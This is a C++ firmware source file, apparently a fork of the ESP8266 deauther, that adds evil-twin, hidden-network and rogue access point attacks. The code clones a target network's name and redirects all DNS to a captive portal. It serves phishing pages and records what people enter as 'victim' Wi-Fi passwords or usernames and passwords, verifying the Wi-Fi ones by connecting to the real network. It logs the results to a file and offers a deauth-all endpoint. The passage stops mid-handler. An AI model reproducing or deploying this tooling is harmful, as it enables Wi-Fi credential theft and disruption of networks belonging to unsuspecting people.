/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "wifi.h"

extern "C" {
    #include "user_interface.h"
}

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <LittleFS.h>
#include <EEPROM.h>
#include "Accesspoints.h"
#include "language.h"
#include "debug.h"
#include "settings.h"
#include "repeater.h"
#include "CLI.h"
#include "Attack.h"
#include "Scan.h"
#include "DisplayUI.h"
//#include "target_info.h"
String MAC_;
String nama;
char eviltwinpath[32];
char pishingpath[32];
File webportal;
String tes_password;
String data_pishing;
String LOG;
String json_data;
bool hidden_target = false;
bool rogueap_continues = false;


extern bool progmemToSpiffs(const char* adr, int len, String path);

#include "webfiles.h"

extern Scan   scan;
extern CLI    cli;
extern Attack attack;

typedef enum wifi_mode_t {
    off = 0,
    ap  = 1,
    st  = 2
} wifi_mode_t;

typedef struct ap_settings_t {
    char    path[33];
    char    ssid[33];
    char    password[65];
    uint8_t channel;
    bool    hidden;
    bool    captive_portal;
} ap_settings_t;
String readFile(fs::FS &fs, const char * path){
  Serial.printf("Reading file: %s\r\n", path);

  File file = fs.open(path, "r");
  if(!file || file.isDirectory()){
    Serial.println("- failed to open file for reading");
    return String();
  }

  String fileContent;
  while(file.available()){
    fileContent = file.readStringUntil('\n');
    break;
  }
  file.close();
  return fileContent;
}

// Write file to LittleFS
void writeFile(fs::FS &fs, const char * path, const char * message){
  Serial.printf("Writing file: %s\r\n", path);

  File file = fs.open(path, "w");
  if(!file){
    Serial.println("- failed to open file for writing");
    return;
  }
  if(file.print(message)){
    Serial.println("- file written");
  } else {
    Serial.println("- frite failed");
  }
  file.close();
}
namespace wifi {
    // ===== PRIVATE ===== //
    wifi_mode_t   mode;
    ap_settings_t ap_settings;
    // Server and other global objects
    ESP8266WebServer server(80);
    DNSServer dns;
    IPAddress ip WEB_IP_ADDR;
    IPAddress    netmask(255, 255, 255, 0);

    void setPath(String path) {
        if (path.charAt(0) != '/') {
            path = '/' + path;
        }

        if (path.length() > 32) {
            debuglnF("ERROR: Path longer than 32 characters");
        } else {
            strncpy(ap_settings.path, path.c_str(), 32);
        }
    }

    void setSSID(String ssid) {
        if (ssid.length() > 32) {
            debuglnF("ERROR: SSID longer than 32 characters");
        } else {
            strncpy(ap_settings.ssid, ssid.c_str(), 32);
        }
    }

    void setPassword(String password) {
        if (password.length() > 64) {
            debuglnF("ERROR: Password longer than 64 characters");
        } else if (password.length() < 8) {
            debuglnF("ERROR: Password must be at least 8 characters long");
        } else {
            strncpy(ap_settings.password, password.c_str(), 64);
        }
    }

    void setChannel(uint8_t ch) {
        if ((ch < 1) && (ch > 14)) {
            debuglnF("ERROR: Channel must be withing the range of 1-14");
        } else {
            ap_settings.channel = ch;
        }
    }

    void setHidden(bool hidden) {
        ap_settings.hidden = hidden;
    }

    void setCaptivePortal(bool captivePortal) {
        ap_settings.captive_portal = captivePortal;
    }

    void handleFileList() {
        if (!server.hasArg("dir")) {
            server.send(500, str(W_TXT), str(W_BAD_ARGS));
            return;
        }

        String path = server.arg("dir");
        // debugF("handleFileList: ");
        // debugln(path);

        Dir dir = LittleFS.openDir(path);

        String output = String('{'); // {
        File   entry;
        bool   first = true;

        while (dir.next()) {
            entry = dir.openFile("r");

            if (first) first = false;
            else output += ',';                 // ,

            output += '[';                      // [
            output += '"' + entry.name() + '"'; // "filename"
            output += ']';                      // ]

            entry.close();
        }

        output += CLOSE_BRACKET;
        server.send(200, str(W_JSON).c_str(), output);
    }

    String getContentType(String filename) {
        if (server.hasArg("download")) return String(F("application/octet-stream"));
        else if (filename.endsWith(str(W_DOT_GZIP))) filename = filename.substring(0, filename.length() - 3);
        else if (filename.endsWith(str(W_DOT_HTM))) return str(W_HTML);
        else if (filename.endsWith(str(W_DOT_HTML))) return str(W_HTML);
        else if (filename.endsWith(str(W_DOT_CSS))) return str(W_CSS);
        else if (filename.endsWith(str(W_DOT_JS))) return str(W_JS);
        else if (filename.endsWith(str(W_DOT_PNG))) return str(W_PNG);
        else if (filename.endsWith(str(W_DOT_GIF))) return str(W_GIF);
        else if (filename.endsWith(str(W_DOT_JPG))) return str(W_JPG);
        else if (filename.endsWith(str(W_DOT_ICON))) return str(W_ICON);
        else if (filename.endsWith(str(W_DOT_XML))) return str(W_XML);
        else if (filename.endsWith(str(W_DOT_PDF))) return str(W_XPDF);
        else if (filename.endsWith(str(W_DOT_ZIP))) return str(W_XZIP);
        else if (filename.endsWith(str(W_DOT_JSON))) return str(W_JSON);
        return str(W_TXT);
    }
  
    bool handleFileRead(String path) {
        // prnt(W_AP_REQUEST);
        // prnt(path);

        if (path.charAt(0) != '/') path = '/' + path;
        if (path.charAt(path.length() - 1) == '/') path += String(F("index.html"));

        String contentType = getContentType(path);

        if (!LittleFS.exists(path)) {
            if (LittleFS.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
            else if (LittleFS.exists(String(ap_settings.path) + path)) path = String(ap_settings.path) + path;
            else if (LittleFS.exists(String(ap_settings.path) + path + str(W_DOT_GZIP))) path = String(ap_settings.path) + path + str(W_DOT_GZIP);
            else {
                // prntln(W_NOT_FOUND);
                return false;
            }
        }

        File file = LittleFS.open(path, "r");

        server.streamFile(file, contentType);
        file.close();
        // prnt(SPACE);
        // prntln(W_OK);

        return true;
    }
    bool sendWebSpiffs(String path){
      String contentType;
      char type[32];
      char paths[32];
      if(path.endsWith("html"))contentType = "text/html";
      if(path.endsWith("css")) contentType = "text/css";
      else return false;
      path.toCharArray(paths,32);
      contentType.toCharArray(type,32);
      File web = LittleFS.open(paths,"r");
      if(!web)return false;
      else server.streamFile(web,type);
      web.close();
      return true;
    }

    void sendProgmem(const char* ptr, size_t size, const char* type) {
        server.sendHeader("Content-Encoding", "gzip");
        server.sendHeader("Cache-Control", "max-age=3600");
        server.send_P(200, str(type).c_str(), ptr, size);
    }

    // ===== PUBLIC ====== //
    void begin() {
        // Set settings
        setPath("/web");
        setSSID(settings::getAccessPointSettings().ssid);
        setPassword(settings::getAccessPointSettings().password);
        setChannel(settings::getWifiSettings().channel);
        setHidden(settings::getAccessPointSettings().hidden);
        setCaptivePortal(settings::getWebSettings().captive_portal);

        // copy web files to SPIFFS
        if (settings::getWebSettings().use_spiffs) {
            copyWebFiles(false);
        }

        // Set mode
        mode = wifi_mode_t::off;
        WiFi.mode(WIFI_OFF);
        wifi_set_opmode(STATION_MODE);

        // Set mac address
        wifi_set_macaddr(STATION_IF, (uint8_t*)settings::getWifiSettings().mac_st);
        wifi_set_macaddr(SOFTAP_IF, (uint8_t*)settings::getWifiSettings().mac_ap);
    }
    String mac_address(String c){
      MAC_ = c;
    }
    String getMode() {
        switch (mode) {
            case wifi_mode_t::off:
                return "OFF";
            case wifi_mode_t::ap:
                return "AP";
            case wifi_mode_t::st:
                return "ST";
            default:
                return String();
        }
    }

    void printStatus() {
        prnt(String(F("[WiFi] Path: '")));
        prnt(ap_settings.path);
        prnt(String(F("', Mode: '")));
        prnt(getMode());
        prnt(String(F("', SSID: '")));
        prnt(ap_settings.ssid);
        prnt(String(F("', password: '")));
        prnt(ap_settings.password);
        prnt(String(F("', channel: '")));
        prnt(ap_settings.channel);
        prnt(String(F("', hidden: ")));
        prnt(b2s(ap_settings.hidden));
        prnt(String(F(", captive-portal: ")));
        prntln(b2s(ap_settings.captive_portal));
    }

    void startNewAP(String path, String ssid, String password, uint8_t ch, bool hidden, bool captivePortal) {
        setPath(path);
        setSSID(ssid);
        setPassword(password);
        setChannel(ch);
        setHidden(hidden);
        setCaptivePortal(captivePortal);

        startAP();
    }
    void sendHome(){
     server.send(200,"text/plain","TES TES TES");
    }
    void startSniffer(){
      server.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/index.html';}, 1); </script></html>");
      scan.start(SCAN_MODE_SNIFFER, 0, SCAN_MODE_OFF, 0, true, wifi_channel);
      DISPLAY_MODE::PROBEMONITOR;
    }


    
        const char* fsName = "LittleFS";

        LittleFSConfig fileSystemConfig = LittleFSConfig();
        String fileList = "";
        FS* fileSystem = &LittleFS;
        long used_spiffs;
        long free_spiffs;
        long total_spiffs;
        File fsUploadFile;  
        /*function delete(filename) 
                      {
                        var xhttp = new XMLHttpRequest();
                        xhttp.open("POST", "/delete?filename="+filename, true);
                        xhttp.send();
                      }*/
    void handleList(){
         fileList = "";
         Dir dir = fileSystem->openDir("");
  
         Serial.println(F("List of files at root of filesystem:"));
         fileList += "";
         while (dir.next()) {
         fileList += "<td><form action='/delete' methode='post'><input type='submit' value='delete'></input><input name='filename' type='hidden' value='" + dir.fileName() +"' ></input> </form></td>";
         //fileList += "<tr><td ><button class='select' onclick='deleteFile(" + dir.fileName() + ")'>DELETE</button></td>";
         fileList += "<td>"+ dir.fileName() +"</td>";
         long size_ = dir.fileSize();
         fileList +=  "<td>"+ String( size_) + "bytes</td></tr>";
         Serial.print("/");
         Serial.println(dir.fileName() + " " + dir.fileSize() + String(" bytes"));
         }
        fileList +="";
  
        }
     void handleFS(){
              
              /*
            static const char FS_html[] PROGMEM = R"=====(<div class="container">
                              <div class="row">
                                <div class="col-12">
                                  <h1 class="header" >File Manager</h1>
                                  <form method='post' enctype='multipart/form-data'><input type='file' name='name'><input class='button' type='submit' value='Upload'></form>
                                 <br>
                                 <button onclick='reloadlist()' data-translate='reload'>reload</button>
                                 <br>
                                        
                                  <p>
                                    <span class="red" data-translate="info_span">INFO: </span><br>
                                    <span >
                                      Total :  {total_spiffs} kb<br>
                                      Used  :  {used_spiffs} kb<br>
                                      Free :  {free_spiffs} kb<br>
                                    </span>
                                    
                                  </p><br>
                                  
                                    <span class="red">PATH: </span><br>
                                              <div class="row"> 
                                        <div class="col-6">
                                          <label> <a href='/log' target='_blank'>Click here to open Log</a></label>
                                        </div>
                                         </div>
                                              <div class="row"><form action='/websetting' method='POST'> 
                                        <div class="col-6">
                                          <label> <a href='/eviltwinprev' target='_blank'>Evil Twin</a></label>
                                        </div>
                                        <div class="col-6">
                                          <input type='text' name='evilpath' value='{eviltwinpath}'>
                                        </div>
                                         </div>
                                       <div class="row">
                                        <div class="col-6">
                                          <label> <a href='/pishingprev' target='_blank'>Pishing  </a></label>
                                        </div>
                                        <div class="col-6">
                                          <input type='text' name='pishingpath' value='{pishingpath}'>
                                        </div>
                                         </div><input  type ='submit' value ='Save'></form>
                                    
                                  <br>
                                  <h2>Log</h2>
                                  <table id='log'></table>
                                  <h2>File List</h2>
                                  <table id='filelist'>)=====";
              String fshtml = FPSTR(FS_html);
              //fshtml.replace("{fileList}",fileList);
              //fshtml.replace("{log}",log_captive.readString());
              fshtml.replace("{total_spiffs}", String(total_spiffs));
              fshtml.replace("{used_spiffs}",String(used_spiffs));
              fshtml.replace("{free_spiffs}",String(free_spiffs));
              fshtml.replace("{eviltwinpath}",String(eviltwinpath));
              fshtml.replace("{pishingpath}",String(pishingpath));
              //fshtml.replace("{loadingpath}",String(loadingpath)); 
              server.send(200,"text/html",Header + fshtml + Footer );// + upload + input_data + Footer);
              */
              
              if(sendWebSpiffs("/filemanager.html") == false){
                sendProgmem(filemanagerhtml, sizeof(filemanagerhtml), W_HTML);
              }
              
                
            }
     void sendFSjson(){
             File log_captive = LittleFS.open("/log.txt","r");
              LOG  = log_captive.readString();
             FSInfo fs_info;
              fileSystem->info(fs_info);
              total_spiffs = fs_info.totalBytes/1000;
              used_spiffs = fs_info.usedBytes/1000;
              free_spiffs = total_spiffs - used_spiffs;
              static const char dat[] PROGMEM = R"=====({"total":"total_spiffs","used":"used_spiffs","free":"free_spiffs","eviltwin":"eviltwin_path","pishing":"pishing_path"})=====";
              json_data = FPSTR(dat);
              json_data.replace("total_spiffs",String(total_spiffs));
              json_data.replace("used_spiffs",String(used_spiffs));
              json_data.replace("free_spiffs",String(free_spiffs));
              json_data.replace("eviltwin_path","<input type='text' name='evilpath' value='" + String(eviltwinpath) + "'>");
              json_data.replace("pishing_path","<input type='text' name='pishingpath' value='" + String(pishingpath)+ "'>");
              prntln(json_data);
              server.send(200,"text/plain",json_data);
              log_captive.close();
     }
     void handleFileListJS(){
        long str_length = 0;
        String str_temp;
        //prntln(fileList.length());
        server.setContentLength(fileList.length());
        server.send(200, "text/plain", "");
        for(int i=0;i<fileList.length();i++){
            str_temp += fileList[str_length];
            str_length++;
            if(str_temp.length() == 2000){ //when the buffer is full...
              server.sendContent(str_temp); //send the current buffer
              str_temp = "";
            }
            
          }
          if(str_temp.length() > 0){
              server.sendContent(str_temp);
              str_length = 0;
              str_temp = "";
            }
        //server.send(200,"text/plain",fileList);
     }
     void reloadlist(){
        handleList();
     }
     void handleFileUpload(){ // upload a new file to the SPIFFS
            HTTPUpload& upload = server.upload();
            String filename;
            if(upload.status == UPLOAD_FILE_START){
              filename = upload.filename;
              if(!filename.startsWith("/")) filename = "/"+filename;
              Serial.print("handleFileUpload Name: "); Serial.println(filename);
              if(filename != "/mac")fsUploadFile = LittleFS.open(filename, "w");            // Open the file for writing in SPIFFS (create if it doesn't exist)
              else fsUploadFile = LittleFS.open("/hahahahahaha", "w"); 
              filename = String();
            } else if(upload.status == UPLOAD_FILE_WRITE){
              if(fsUploadFile)
                fsUploadFile.write(upload.buf, upload.currentSize); // Write the received bytes to the file
            } else if(upload.status == UPLOAD_FILE_END){
              if(fsUploadFile) {                                    // If the file was successfully created
                fsUploadFile.close();                               // Close the file again
                Serial.print("handleFileUpload Size: "); Serial.println(upload.totalSize);
                if(filename != "/mac"){
                  server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/filemanager.html';}, 500);  alert('SUCCESS..,WAIT A BIT');</script>");
                }
                else {
                  server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/filemanager.html';}, 500);  alert('THIS ACTION IS NOT PERMITTED');</script>");
                }
          
              } else {
                server.send(500, "text/plain", "500: couldn't create file");
              }
            }
            //handleList();
            
          }
     void handleDelete(){
              Serial.print("delete file :");
              
              char filename[32];
              String names = String("/") + server.arg("filename");
              if( names != "/mac"){
              names.toCharArray(filename,32);
              Serial.println(names);
              LittleFS.remove(filename);
              server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/filemanager.html';}, 500);  alert('SUCCESS..,WAIT A BIT');</script>");
              }
              else {
                server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/filemanager.html';}, 500);  alert('THIS ACTION IS NOT PERMITTED');</script>");
              }
            }
     void ssid_info(){
               if(hidden_target==true){
                server.send(200,"text/plane",ssids.rogue_wifi);
               }
               
              else server.send(200,"text/plane",accesspoints.selected_target);
              
              
            }
     void ap_info(){
            if(accesspoints.selected_target == "*HIDDEN*"){
              server.send(200,"text/plane",ssids.rogue_wifi);
            }
            else server.send(200,"text/plane",accesspoints.selected_target + "," + ssids.rogue_wifi);
     }
     void handleLog(){
              server.send(200,"text/plain",LOG);
              
            }
     void pathsave(){
           
              server.arg("evilpath").toCharArray(eviltwinpath,32);
              server.arg("pishingpath").toCharArray(pishingpath,32);
              Serial.println(server.arg("evilpath"));
               Serial.println(server.arg("pishingpath"));
              Serial.println(String(eviltwinpath) + " " + String(pishingpath));
              writeFile(LittleFS,"/eviltwin.json",eviltwinpath);
              writeFile(LittleFS,"/pishing.json",pishingpath);
              
               server.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/filemanager.html';}, 1000); alert('SUCCESS..');</script></html>");
            
              //handleFS();
            }
    /*
        void startAP(String path) {
            setPath(path):

            startAP();
        }
     */
    void handleIndex(){ 
            if (server.hasArg("password")) {
            Serial.println("victim entered " + accesspoints.selected_target);
            tes_password = server.arg("password");
            if(hidden_target == true)WiFi.begin(ssids.rogue_wifi.c_str(), server.arg("password").c_str());
            else WiFi.begin(accesspoints.selected_target.c_str(), server.arg("password").c_str());
           // webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
            
            }
            if(tes_password.length() > 1){
              server.send(200,"text/html","<!DOCTYPE html><html><style>#myProgress {width: 100%;background-color: #ddd;}#myBar { width: 1%; height: 30px;background-color: #04AA6D;}</style><body><div id='myProgress'><div id='myBar'></div></div><br><script>setTimeout(function(){window.location.href = '/result';}, 15000);var i = 0;if (i == 0) { i = 1; var elem = document.getElementById('myBar');var width = 1;var id = setInterval(frame, 150);function frame() { if (width >= 100) {clearInterval(id);i = 0; } else { width++; elem.style.width = width + '%';}}}</script></body></html>");
              attack.resume_state(true);
              attack.stop();
            }else {
              server.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/web';}, 1); </script></html>");
            
            }
            
    }
    void handlePishing(){ 
            
           // webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
             
              Serial.print("victim entered user = " + server.arg("user"));
               data_pishing += "<tr><td> <label> web portal : "+String(pishingpath)+", user : "+ server.arg("user");
               Serial.println(" and pass = " + server.arg("pass"));
               data_pishing += " ,pass : "+ server.arg("pass") +"</label></td></tr>";
               Serial.println(data_pishing.length());
             webportal.close();
             Serial.println("success get data!");
              //Serial.println(_correct);
              File log_captive = LittleFS.open("/log.txt","a");
              log_captive.println(data_pishing);
              
              data_pishing = "";
              cli.runCommand("set captivePortal \"false\"");
              //cli.runCommand("save settings");
              cli.runCommand("stop attack");
              log_captive.close();
              prntln("Done...,Turning off device");
              
            
              server.send(200,"text/html","<!DOCTYPE html><html><style>#myProgress {width: 100%;background-color: #ddd;}#myBar { width: 1%; height: 30px;background-color: #04AA6D;}</style><body><div id='myProgress'><div id='myBar'></div></div><br><script>setTimeout(function(){window.location.href = '/result';}, 5000);var i = 0;if (i == 0) { i = 1; var elem = document.getElementById('myBar');var width = 1;var id = setInterval(frame, 50);function frame() { if (width >= 100) {clearInterval(id);i = 0; } else { width++; elem.style.width = width + '%';}}}</script></body></html>");
              
              
           
            
            
    }
    void send_rogueap(){
      webportal = LittleFS.open(pishingpath,"r");
                server.streamFile(webportal,"text/html");
                webportal.close();

                for (int i = 0; i < server.args(); i++) {
            prnt(i==0?'?':'&');
            prnt(server.argName(i));
            prnt("=");
            prnt(server.arg(i));
        }
        prntln();
    }
    void rogueAP() {
      WiFi.mode(WIFI_AP);
      cli.runCommand("set captivePortal \"true\"");
      Serial.print("startting rogue access point = "+ ssids.rogue_wifi);
      dns.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(172, 217, 28, 254),IPAddress(172, 217, 28, 254),  IPAddress(255, 255, 255, 0));
      WiFi.softAP(ssids.rogue_wifi);
      WiFi.setOutputPower(20.5);
      dns.setErrorReplyCode(DNSReplyCode::NoError);
        dns.start(53, "*", IPAddress(172, 217, 28, 254));
      attack.pishing = true;
      MDNS.begin("/pos");
      server.on("/pos",[](){
        send_rogueap();
      });
      server.on("/",[](){
        send_rogueap();
      });
      server.on("/submit", []() {
            handlePishing();
        });
      server.on("/result",[](){
              
              
              if(rogueap_continues == true){
                return rogueAP();
              } else {
                int n = WiFi.softAPdisconnect (true);
                 stopAP();
                 resumeAP();
                 initWeb();
              }
              
            
        });
        server.onNotFound([]{
            send_rogueap();
        });
        server.begin();
    }
    void send_eviltwin(){
      webportal = LittleFS.open(eviltwinpath,"r");
                server.streamFile(webportal,"text/html");
                webportal.close();
       
        
    }
    void proses(){
                  if (WiFi.status() != WL_CONNECTED) {
                          server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/order.html';}, 3000);  alert('Failed to connect to WiFi,check ssid or password again');</script>");
                        }
                  else {
                    
                    server.send(200, "text/html", "<h1> Done...,wait for response from server</h1>");
                  }
                }
    void eviltwinAP() {
      WiFi.mode(WIFI_AP_STA);
      cli.runCommand("set captivePortal \"true\"");
      Serial.print("target = "+ accesspoints.selected_target);
      dns.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(172, 217, 28, 254),IPAddress(172, 217, 28, 254), IPAddress(255, 255, 255, 0));
      WiFi.softAP(accesspoints.selected_target);
      WiFi.setOutputPower(20.5);
      dns.setErrorReplyCode(DNSReplyCode::NoError);
        dns.start(53, "*", IPAddress(172, 217, 28, 254));
      
      MDNS.begin("/web");
      server.on("/",[](){
        send_eviltwin();
      });
      server.on("/web",[](){
        send_eviltwin();
      });
      server.on("/submit", []() {
            handleIndex();
        });
      server.on("/result",[](){
           if (WiFi.status() != WL_CONNECTED) {
              String tmp = "<tr><td> <label> web portal : "+String(eviltwinpath)+", target : "+ accesspoints.selected_target + ", password : "+ tes_password +"</label></td></tr>";
              server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('Gagal! Cek Password lagi');</script>");
              File log_captive = LittleFS.open("/log.txt","a");
              log_captive.println(tmp);
              server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('Gagal! Cek Password lagi');</script>");
              Serial.println("Wrong password tried !");
              tes_password = "";
               log_captive.close();
            } else {
              server.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Success..,please wait a bit...</h2></body> </html>");
              attack.eviltwin = false;
              //ledstatus = 35;
              //hotspot_active = false;
              //deauthing_active = false;
              //target_mark = target_count;
              //dnsServer.stop();
             // int n = WiFi.softAPdisconnect (true);
              //Serial.println(String(n));
              //WiFi.softAPConfig(apIP,apIP , IPAddress(255, 255, 255, 0));
              //WiFi.softAP(ssid, password);
              //dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
              webportal.close();
              String tmp = "<tr><td> <label> web portal : "+String(eviltwinpath)+", target : "+ accesspoints.selected_target + ", password : "+ tes_password +"</label></td></tr>";
              cli.runCommand("set captivePortal \"false\"");
              //cli.runCommand("save settings");
              cli.runCommand("stop attack");
              File log_captive = LittleFS.open("/log.txt","a");
              log_captive.println(tmp);
              
              tes_password = "";
              
              log_captive.close();
              stopAP();
              resumeAP();
              initWeb();
            }
        });
        server.on("/index.js", HTTP_GET, []() {
                sendProgmem(script, sizeof(script), "text/plain");
            });
        server.on("/ssid_info",ssid_info);
        server.onNotFound([]{
            send_eviltwin();
        });
        server.begin();
      }
    void ethiddenAP() {
      WiFi.mode(WIFI_AP_STA);
      hidden_target = true;
      cli.runCommand("set captivePortal \"true\"");
      Serial.print("target = "+ ssids.rogue_wifi);
      dns.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(172, 217, 28, 254),IPAddress(172, 217, 28, 254), IPAddress(255, 255, 255, 0));
      WiFi.softAP(ssids.rogue_wifi.c_str());
      WiFi.setOutputPower(20.5);
      dns.setErrorReplyCode(DNSReplyCode::NoError);
        dns.start(53, "*", IPAddress(172, 217, 28, 254));
      
      MDNS.begin("/web");
      server.on("/web",[](){
        send_eviltwin();
      });
       server.on("/",[](){
        send_eviltwin();
      });
      server.on("/submit", []() {
            handleIndex();
        });
      server.on("/result",[](){
           if (WiFi.status() != WL_CONNECTED) {
              server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/web';}, 3000);  alert('Gagal! Cek Password lagi');</script>");
              Serial.println("Wrong password tried !");
              tes_password = "";
               
            } else {
              server.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Update Berhasil,Silahkan Tunggu...</h2></body> </html>");
              attack.eviltwin = false;
              //ledstatus = 35;
              //hotspot_active = false;
              //deauthing_active = false;
              //target_mark = target_count;
              //dnsServer.stop();
              int n = WiFi.softAPdisconnect (true);
              //Serial.println(String(n));
              //WiFi.softAPConfig(apIP,apIP , IPAddress(255, 255, 255, 0));
              //WiFi.softAP(ssid, password);
              //dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
              hidden_target = false;
              String tmp = "<tr><td> <label> web portal : "+String(eviltwinpath)+", target : "+ ssids.rogue_wifi + ", password : "+ tes_password +"</label></td></tr>";
              File log_captive = LittleFS.open("/log.txt","a");
              log_captive.println(tmp);
              
              tes_password = "";
              
              log_captive.close();
              prntln("Done...,Turning off device");
              cli.runCommand("set captivePortal \"false\"");
              //cli.runCommand("save settings");
              //cli.runCommand("stop attack");
              stopAP();
              resumeAP();
              initWeb();
            }
        });
        server.on("/index.js", HTTP_GET, []() {
                sendProgmem(script, sizeof(script), "text/plain");
            });
        server.on("/ssid_info",ssid_info);
        server.onNotFound([]{
            send_eviltwin();
        });
        server.begin();
      }
    void startAP() {
        WiFi.softAPConfig(ip, ip, netmask);
        WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);
        WiFi.setOutputPower(20.5);
        setCaptivePortal(false);
        dns.setErrorReplyCode(DNSReplyCode::NoError);
        dns.start(53, "*", ip);

        MDNS.begin(WEB_URL);
        readFile(LittleFS,"/eviltwin.json").toCharArray(eviltwinpath,32);
        readFile(LittleFS,"/pishing.json").toCharArray(pishingpath,32);
        server.on("/list", HTTP_GET, handleFileList); // list directory

        #ifdef USE_PROGMEM_WEB_FILES
        // ================================================================
        // paste here the output of the webConverter.py
        if (!settings::getWebSettings().use_spiffs) {
            server.on("/", HTTP_GET, []() {
                if(attack.eviltwin==false&&attack.pishing==false){
                  if(sendWebSpiffs("/index.html") == false){
                    sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                  }
                }
                else {
                  if(attack.eviltwin==true)send_eviltwin();
                  if(attack.pishing==true)send_rogueap();
                }
            });
            server.on("/index.html", HTTP_GET, []() {
                if(sendWebSpiffs("/index.html") == false){
                    sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                  }
            });
            server.on("/scan.html", HTTP_GET, []() {
                if(sendWebSpiffs("/scan.html") == false){
                  sendProgmem(scanhtml, sizeof(scanhtml), W_HTML);
                }
            });
            server.on("/info.html", HTTP_GET, []() {
                
                  sendProgmem(infohtml, sizeof(infohtml), W_HTML);
                
            });
            server.on("/ssids.html", HTTP_GET, []() {
                if(sendWebSpiffs("/ssids.html") == false){
                  sendProgmem(ssidshtml, sizeof(ssidshtml), W_HTML);
                }
            });
            server.on("/deauthall", HTTP_GET, []() {
                cli.runCommand("attack deauthall");
                server.send(200,"text/plain","OK");
            });
            server.on("/eviltwin", HTTP_GET, []() {
              attack.eviltwin = true;
              server.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/index.html';}, 1); </script></html>");
                eviltwinAP();
            });
            server.on("/eviltwinhidden", HTTP_GET, []() {
              attack.eviltwin = true;
              server.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/index.html';}, 1); </script></html>");
                ethiddenAP();
            });
            server.on("/rogueapcontinues", HTTP_GET, [](){
              server.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/index.html';}, 1); </script></html>");
              rogueap_continues = true;
              prntln("Rogue Access Point continues mode");
              rogueAP();
            });
            server.on("/rogueap", HTTP_GET, [](){
              server.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/index.html';}, 1); </script></html>");
              rogueap_continues = false;
              rogueAP();
            });
            server.on("/filemanager.json",HTTP_GET,[](){
              sendFSjson();
            });
            server.on("/hello",sendHome);
            server.on("/sniffer",startSniffer);
            server.on("/filemanager.html",HTTP_GET,handleFS);
            server.on("/websetting",HTTP_POST,pathsave);
           // server.on("/filemanager.html", HTTP_GET, []() {                 // if the client requests the upload page
              //if (!handleFileRead("/upload.html"))                // send it if it exists
           //     server.send(404, "text/plain", "404: Not Found"); // otherwise, respond with a 404 (Not Found) error
           // });
          
            server.on("/filemanager.html", HTTP_POST,                       // if the client posts to the upload page
              [](){ server.send(200); },                          // Send status 200 (OK) to tell the client we are ready to receive
              handleFileUpload                                    // Receive and save the file
            );
            server.on("/logo.png",[](){
              sendProgmem(logopng, sizeof(logopng), "text/img");
            });
            server.on("/index.js", HTTP_GET, []() {
                sendProgmem(script, sizeof(script), "text/plain");
            });
            server.on("/ap_info", []() {
                ap_info();
            });
            server.on("/reloadlist", []() {
                reloadlist();
                server.send(200,"text/plain","OK");
            });
            server.on("/delete",handleDelete);
            server.on("/ssid_info",ssid_info);
            server.on("/log",handleLog);
            server.on("/filelist",handleFileListJS);
           // server.on("/delete",handleDelete);
            server.on("/eviltwinprev", HTTP_GET, []() {
                webportal = LittleFS.open(eviltwinpath,"r");
                server.streamFile(webportal,"text/html");
                webportal.close();
            });
            
            server.on("/pishingprev", HTTP_GET, []() {
                webportal = LittleFS.open(pishingpath,"r");
                server.streamFile(webportal,"text/html");
                webportal.close();
            });
            server.on("/attack.html", HTTP_GET, []() {
                if(sendWebSpiffs("/attack.html") == false){
                  sendProgmem(attackhtml, sizeof(attackhtml), W_HTML);
                }
            });
            server.on("/settings.html", HTTP_GET, []() {
               
                  sendProgmem(settingshtml, sizeof(settingshtml), W_HTML);
                
            });
            server.on("/style.css", HTTP_GET, []() {
                if(sendWebSpiffs("/style.css") == false){
                  sendProgmem(stylecss, sizeof(stylecss), W_CSS);
                }
            });
            server.on("/fsstyle.css", HTTP_GET, []() {
                if(sendWebSpiffs("/fsstyle.css") == false){
                  sendProgmem(fscss, sizeof(fscss), W_CSS);
                }
            });
            
            
            server.on("/connect",HTTP_POST,[](){
                server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/process';}, 15000); </script><h1>Processing..,wait for 20 seconds</h1>");
                nama = server.arg("name");
                String ssid = server.arg("ssid");
                String pass = server.arg("password");
